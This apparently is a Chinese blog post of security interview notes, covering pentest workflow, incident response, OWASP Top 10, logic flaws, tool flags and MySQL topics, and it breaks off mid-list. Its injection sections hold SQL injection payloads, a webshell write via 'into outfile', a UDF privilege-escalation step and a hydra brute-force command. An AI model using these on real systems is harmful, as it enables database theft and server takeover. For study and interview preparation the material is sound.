<li><a href="#%E7%AE%97%E6%B3%95">算法</a><ul>
<li><a href="#%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E5%BF%AB%E6%8E%92-%E4%BA%8C%E5%88%86-%E5%86%92%E6%B3%A1">排序算法：快排 二分 冒泡</a></li>
</ul>
</li>
<li><a href="#ldap%E6%B3%A8%E5%85%A5">LDAP注入</a></li>
</ul>
</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25582026">https://zhuanlan.zhihu.com/p/25582026</a></p>
</blockquote>
<blockquote>
<p>给你一个网站你是如何来<em>渗透测试</em>的? - 杨文的文章 - 知乎 <a target="_blank" rel="noopener" href="http://zhuanlan.zhihu.com/p/25605198">http://zhuanlan.zhihu.com/p/25605198</a></p>
</blockquote>
<h1 id="技术面试问题"><a href="#技术面试问题" class="headerlink" title="技术面试问题"></a>技术面试问题</h1><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="说一个印象深刻的CTF的题目"><a href="#说一个印象深刻的CTF的题目" class="headerlink" title="说一个印象深刻的CTF的题目"></a>说一个印象深刻的CTF的题目</h3><ul>
<li>Padding Oracle-&gt;CBC-&gt;密码学(RSA&#x2F;AES&#x2F;DSA&#x2F;SM)</li>
<li>CRC32</li>
<li>反序列化漏洞</li>
</ul>
<h4 id="sql二次注入"><a href="#sql二次注入" class="headerlink" title="sql二次注入"></a>sql二次注入</h4><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
<p>交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1&#x3D;1确定注入点，用order by探测列数，union select探测输出点是第几列，</p>
<ol>
<li>暴库 <code>group_concat(schema_name) from information_schema.schemata</code></li>
<li>暴表 <code>group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39;</code></li>
<li>获取数据 <code>concat(flag) from flag</code></li>
</ol>
<p>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="爬虫模块、框架、反爬虫机制（IP-代理池、验证码破解、UA）"><a href="#爬虫模块、框架、反爬虫机制（IP-代理池、验证码破解、UA）" class="headerlink" title="爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）"></a>爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</h3><h3 id="并发-多线程、线程池、协程、三个程之间的区别"><a href="#并发-多线程、线程池、协程、三个程之间的区别" class="headerlink" title="并发(多线程、线程池、协程、三个程之间的区别)"></a>并发(多线程、线程池、协程、三个程之间的区别)</h3><p>进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。</p>
<h3 id="常用的标准库"><a href="#常用的标准库" class="headerlink" title="常用的标准库"></a>常用的标准库</h3><ul>
<li><h2 id="functools"><a href="#functools" class="headerlink" title="functools"></a>functools</h2></li>
<li>itertools 迭代器<ul>
<li>count&#x2F;cycle&#x2F;repeat</li>
<li>chain</li>
<li>groupby 把迭代器中相邻的重复元素挑出来放在一起</li>
</ul>
</li>
<li>concurrent.futures<ul>
<li>ThreadPoolExecutor</li>
</ul>
</li>
<li>hashlib<ul>
<li>md5</li>
<li>sha1</li>
<li>sha256</li>
<li>sha512</li>
</ul>
</li>
<li>logging </li>
<li>sys.argv argparse读取命令行参数</li>
<li>pickle 序列化工具</li>
<li>re 正则</li>
<li>collections 多种数据类型<ul>
<li>namedtuple</li>
<li>OrderedDict</li>
<li>Counter</li>
</ul>
</li>
<li>os 系统相关的函数</li>
</ul>
<h3 id="DJANGO和FLASK区别和使用"><a href="#DJANGO和FLASK区别和使用" class="headerlink" title="DJANGO和FLASK区别和使用"></a>DJANGO和FLASK区别和使用</h3><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><h3 id="python安全工具编写-源码阅读"><a href="#python安全工具编写-源码阅读" class="headerlink" title="python安全工具编写&#x2F;源码阅读"></a>python安全工具编写&#x2F;源码阅读</h3><h3 id="证明能力"><a href="#证明能力" class="headerlink" title="证明能力"></a>证明能力</h3><ul>
<li>python安全工具开发</li>
<li>python项目，记一下技术细节</li>
</ul>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h3 id="国内SM系列"><a href="#国内SM系列" class="headerlink" title="国内SM系列"></a>国内SM系列</h3><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img data-src="F:\blog\source_posts\技术面试\5aa223dbc8662.jpg"></p>
<h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><ul>
<li>资产：资产价值</li>
<li>威胁：威胁主体、影响对象、出现频率、动机等</li>
<li>脆弱性：资产弱点的严重程度‘</li>
</ul>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="Fority-SCA审计JAVA代码"><a href="#Fority-SCA审计JAVA代码" class="headerlink" title="Fority SCA审计JAVA代码"></a>Fority SCA审计JAVA代码</h3><p>fortify用到什么模块? 过滤器 自定义规则 生成报告</p>
<h3 id="Seay审计PHP代码"><a href="#Seay审计PHP代码" class="headerlink" title="Seay审计PHP代码"></a>Seay审计PHP代码</h3><h3 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h3><h2 id="应急响应具体流程"><a href="#应急响应具体流程" class="headerlink" title="应急响应具体流程"></a>应急响应具体流程</h2><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26542790">https://zhuanlan.zhihu.com/p/26542790</a></p>
</blockquote>
<p>PDCERF模型</p>
<ul>
<li>Prepare（准备）：准备用来检测的工具和人</li>
<li>Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS&#x2F;WAF&#x2F;SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告</li>
<li>Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平</li>
<li>Eradication（根除）</li>
<li>Recover（恢复）</li>
<li>Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><h5 id="DDOS是什么"><a href="#DDOS是什么" class="headerlink" title="DDOS是什么"></a>DDOS是什么</h5><p>分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。</p>
<p>DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。</p>
<p>如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我司网站<a target="_blank" rel="noopener" href="http://www.catroot.cn的ip/">www.catroot.cn的IP</a>  223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/19581905">https://www.zhihu.com/question/19581905</a></p>
</blockquote>
<ul>
<li>网络设备设施<ul>
<li>拼带宽，加大带宽，但是成本太高</li>
<li>使用硬件防火墙</li>
<li>选用高性能设备</li>
</ul>
</li>
<li>抗D思想和方案<ul>
<li>负载均衡</li>
<li>花钱买流量清洗服务</li>
<li>CDN：web层，比如cc攻击</li>
<li>分布式集群防御</li>
<li>高防：防大部分攻击，udp、大型的cc攻击</li>
</ul>
</li>
<li>预防为主<ul>
<li>系统漏洞</li>
<li>系统资源优化：</li>
<li>过滤不必要的服务和端口</li>
<li>限制特定流量：检查访问来源做适当限制</li>
</ul>
</li>
</ul>
<h4 id="主机被入侵"><a href="#主机被入侵" class="headerlink" title="主机被入侵"></a>主机被入侵</h4><ol>
<li>优先提取易消失的数据<ul>
<li>内存信息</li>
<li>系统进程<code>free -m</code></li>
<li>路由信息<code>tracert</code></li>
</ul>
</li>
<li><code>ifconfig</code>查看网卡流量，检查网卡的发送、接收数据情况</li>
<li><code>NetHogs</code>实时监控带宽占用状况</li>
<li>查看Linux系统日志 <code>/var/log</code></li>
<li><code>ClamAV</code>杀毒软件</li>
</ol>
<h2 id="渗透测试流程相关"><a href="#渗透测试流程相关" class="headerlink" title="渗透测试流程相关"></a>渗透测试流程相关</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><ol>
<li>项目访谈</li>
<li>信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息</li>
<li>漏洞扫描：Nessus, AWVS</li>
<li>手动挖掘：逻辑漏洞</li>
<li>验证漏洞</li>
<li>修复建议</li>
<li>（如果有）基线检查&#x2F;复验漏洞</li>
<li>输出报告<ul>
<li>概述</li>
<li>测试基本信息<ul>
<li>测试范围</li>
<li>测试时间</li>
<li>测试任务</li>
<li>测试过程</li>
</ul>
</li>
<li>信息安全风险综合分析<ul>
<li>整体风险分析</li>
<li>风险影响分析</li>
<li>系统安全分析</li>
<li>安全漏洞列表</li>
</ul>
</li>
<li>解决方案建议</li>
<li>复测报告</li>
</ul>
</li>
</ol>
<h3 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h3><p>用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。<br>如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。</p>
<h3 id="渗透测试具体实施"><a href="#渗透测试具体实施" class="headerlink" title="渗透测试具体实施"></a>渗透测试具体实施</h3><h3 id="17年OWASP-TOP10"><a href="#17年OWASP-TOP10" class="headerlink" title="17年OWASP TOP10"></a>17年OWASP TOP10</h3><ul>
<li>注入:sql,nosql,ldap,os</li>
<li>失效的身份认证: </li>
<li>敏感信息泄漏</li>
<li>XXE XML外部实体</li>
<li>失效的访问控制：管理页面仅能管理员权限访问；越权漏洞</li>
<li>安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用</li>
<li>XSS</li>
<li>不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆</li>
<li>使用含有已知漏洞的组件：比如structs2框架</li>
<li>不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应</li>
</ul>
<h3 id="常见的Web安全漏洞"><a href="#常见的Web安全漏洞" class="headerlink" title="常见的Web安全漏洞"></a>常见的Web安全漏洞</h3><ul>
<li>SQL注入</li>
<li>XSS</li>
<li>文件遍历、文件上传、文件下载</li>
<li>垂直越权、水平越权</li>
<li>逻辑漏洞</li>
</ul>
<h3 id="挖过什么逻辑漏洞"><a href="#挖过什么逻辑漏洞" class="headerlink" title="挖过什么逻辑漏洞"></a>挖过什么逻辑漏洞</h3><h4 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h4><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。</p>
<p>预防思路：</p>
<ul>
<li>订单需要多重效验<br><img data-src="F:\blog\source_posts\技术面试\14715932566558.png"></li>
<li>订单数值较大的时候需要人工审核</li>
</ul>
<h4 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h4><p>漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</p>
<p>预防思路：</p>
<ul>
<li>response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加</li>
<li>如果要进行前端验证的话也可以，但是需要进行加密</li>
</ul>
<h4 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h4><p>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。</p>
<p>预防思路：</p>
<ul>
<li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证</li>
</ul>
<h4 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h4><ul>
<li>某电商登陆接口无验证导致撞库</li>
<li>某招聘网验证码无限制枚举</li>
<li>某快递公司优惠券枚举</li>
<li>某电商会员卡卡号枚举</li>
</ul>
<p>预防思路：</p>
<ul>
<li><p>在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。</p>
</li>
<li><p>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</p>
</li>
<li><p>验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。</p>
</li>
<li><p>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。</p>
</li>
</ul>
<h4 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h4><ul>
<li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举.</li>
<li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li>
<li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li>
<li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li>
</ul>
<p>预防思路</p>
<ol>
<li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。</li>
<li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li>
<li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li>
<li>cookie中设定session参数，以防cookie可以长时间生效。</li>
<li>根据业务不同还有很多方法</li>
</ol>
<h3 id="找回密码功能缺陷"><a href="#找回密码功能缺陷" class="headerlink" title="找回密码功能缺陷"></a>找回密码功能缺陷</h3><ol start="2">
<li>单纯读取内存值作为用户凭证</li>
<li>电商系统加车、下单漏洞</li>
</ol>
<h3 id="你常用的渗透工具有哪些，最常用的是哪个？"><a href="#你常用的渗透工具有哪些，最常用的是哪个？" class="headerlink" title="你常用的渗透工具有哪些，最常用的是哪个？"></a>你常用的渗透工具有哪些，最常用的是哪个？</h3><h4 id="扫描-Nessus-AWVS-Nikto"><a href="#扫描-Nessus-AWVS-Nikto" class="headerlink" title="扫描:Nessus,AWVS,Nikto"></a>扫描:Nessus,AWVS,Nikto</h4><h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ski_12/article/details/58188331">https://blog.csdn.net/ski_12/article/details/58188331</a></p>
</blockquote>
<p>常用参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-u 单个URL -m xx.txt 多个URL</span><br><span class="line">-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;  作为服务器客户端，直接连接数据库</span><br><span class="line">--data post/get都适用</span><br><span class="line">-p 指定扫描的参数</span><br><span class="line">-r 读取文件</span><br><span class="line">-f 指纹信息</span><br><span class="line">--tamper 混淆脚本，用于应用层过滤</span><br><span class="line">--cookie --user-agent --host等等http头的修改</span><br><span class="line">--threads 并发线程 默认为1</span><br><span class="line">--dbms MySQL&lt;5.0&gt; 指定数据库或版本</span><br><span class="line"></span><br><span class="line">–level=LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险</span><br><span class="line">–current-db / 获取当前数据库名称</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–tables 枚举 DBMS 数据库中的表</span><br><span class="line">–columns 枚举 DBMS 数据库表列</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>常用的tamper</p>
<blockquote>
<p>本地：sqlmap-tamper分类.xlsx</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64encode.py #转为b64编码</span><br><span class="line">charencode.py url编码</span><br><span class="line">chardoubleencode.py 双URL编码</span><br><span class="line">unmagicquotes.py 宽字节</span><br><span class="line">randomcomments.py 用/**/分割SQL关键字</span><br><span class="line">space2plus.py space2comment.py space2xxxx.py 替换空格为xx</span><br></pre></td></tr></table></figure>

<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap hostname/ip或者多个ip或者子网192.168.123.*</span><br><span class="line">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="line">-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描</span><br><span class="line">-O 探测操作系统信息</span><br><span class="line">-sV 查找主机服务版本号</span><br><span class="line">-sA 探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="line">-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="line">-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="line">-sN TCP空扫描</span><br><span class="line">-F 快速扫描</span><br><span class="line">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="line">-p 指定端口/端口范围</span><br><span class="line">-oN 将报告写入文件</span><br><span class="line">-v 详细信息</span><br><span class="line">-T&lt;0-5&gt; 设定速度</span><br></pre></td></tr></table></figure>

<p>Nmap还可以用到爆破等一些脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--script all 使用所有脚本</span><br><span class="line">--script=sql.injection.nse sql注入</span><br><span class="line">--script=&quot;smb*&quot;  扫smb系列</span><br></pre></td></tr></table></figure>


<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>使用内置模块。HR：常用的模块有哪些？<br>tcp反向链接 msfvenom</p>
<h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra IP -l loginname -P pass.txt PROTROCL</span><br><span class="line">hydra 127.0.0.1 -l root -P pass.txt ssh</span><br></pre></td></tr></table></figure>

<h4 id="kali信息收集工具"><a href="#kali信息收集工具" class="headerlink" title="kali信息收集工具"></a>kali信息收集工具</h4><ul>
<li>dig</li>
<li>whois</li>
<li>host:查询dns服务器</li>
<li>nslookup</li>
<li>域名枚举：fierse -dns</li>
<li>maltego</li>
<li>onesixtyone</li>
</ul>
<h4 id="流量分析WireShark"><a href="#流量分析WireShark" class="headerlink" title="流量分析WireShark"></a>流量分析WireShark</h4><p>CTF</p>
<h3 id="描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE"><a href="#描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE" class="headerlink" title="描述一个你深入研究过的CVE或POC(ms17-010&#x2F;最新的CVE)"></a>描述一个你深入研究过的CVE或POC(ms17-010&#x2F;最新的CVE)</h3><h2 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/22953267">https://www.zhihu.com/question/22953267</a></p>
</blockquote>
<h3 id="MySQL面试题"><a href="#MySQL面试题" class="headerlink" title="MySQL面试题"></a>MySQL面试题</h3><h4 id="MySQL存储引擎？"><a href="#MySQL存储引擎？" class="headerlink" title="MySQL存储引擎？"></a>MySQL存储引擎？</h4><ol>
<li>InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束</li>
</ol>
<ul>
<li>为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在 SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合</li>
<li>InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上</li>
<li>InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键</li>
</ul>
<ol start="2">
<li>MyISAM：访问速度快，不支持事务，逐渐被淘汰</li>
<li>MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。<code>information_schema</code>用的是该引擎</li>
<li>MERGE、Archive等等不常用的</li>
</ol>
<h4 id="什么是事务？"><a href="#什么是事务？" class="headerlink" title="什么是事务？"></a>什么是事务？</h4><p>事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。<br>举个银行应用的典型例子：</p>
<p>假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤：</p>
<p>a.检查A的支票账户余额高于2000元；</p>
<p>b.从A的支票账户余额中减去2000元；</p>
<p>c.在A的储蓄账户余额中增加2000元。</p>
<p>这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。</p>
<h4 id="读锁和写锁"><a href="#读锁和写锁" class="headerlink" title="读锁和写锁"></a>读锁和写锁</h4><p>读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。</p>
<h4 id="MySQL的索引"><a href="#MySQL的索引" class="headerlink" title="MySQL的索引"></a>MySQL的索引</h4><p>索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。</p>
<h4 id="ORDER-BY在注入的运用"><a href="#ORDER-BY在注入的运用" class="headerlink" title="ORDER BY在注入的运用"></a>ORDER BY在注入的运用</h4><h4 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h4><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。</p>
<h4 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h4><ul>
<li>@为用户变量，使用<code>SET @var1=1</code>赋值</li>
<li>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></li>
</ul>
<h4 id="注入-绕过常用的函数"><a href="#注入-绕过常用的函数" class="headerlink" title="注入&#x2F;绕过常用的函数"></a>注入&#x2F;绕过常用的函数</h4><ol>
<li>基于布尔SQL盲注<ul>
<li><code>left(database(),1)&gt;&#39;s&#39;</code></li>
<li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li>
<li><code>ascii(substr((select database()),1,1))=98</code></li>
<li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li>
<li><code>regexp</code>正则注入 <code>select user() regexp &#39;^[a-z]&#39;;</code></li>
<li><code>select user() like &#39;ro%&#39;</code></li>
</ul>
</li>
<li>基于报错的SQL盲注<ul>
<li><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  </code></li>
</ul>
</li>
</ol>
<h4 id="MySQL存储过程"><a href="#MySQL存储过程" class="headerlink" title="MySQL存储过程"></a>MySQL存储过程</h4><h4 id="各种写shell的问题"><a href="#各种写shell的问题" class="headerlink" title="各种写shell的问题"></a>各种写shell的问题</h4><ol>
<li>写shell用什么函数？ <ul>
<li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li>
<li><code>dumpfile</code></li>
<li><code>file_put_contents</code></li>
</ul>
</li>
<li>outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/5444398.html">https://www.cnblogs.com/milantgh/p/5444398.html</a></li>
<li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li>
<li>sleep()能不能写shell？</li>
<li>写shell的条件？<ul>
<li>用户权限</li>
<li>目录读写权限</li>
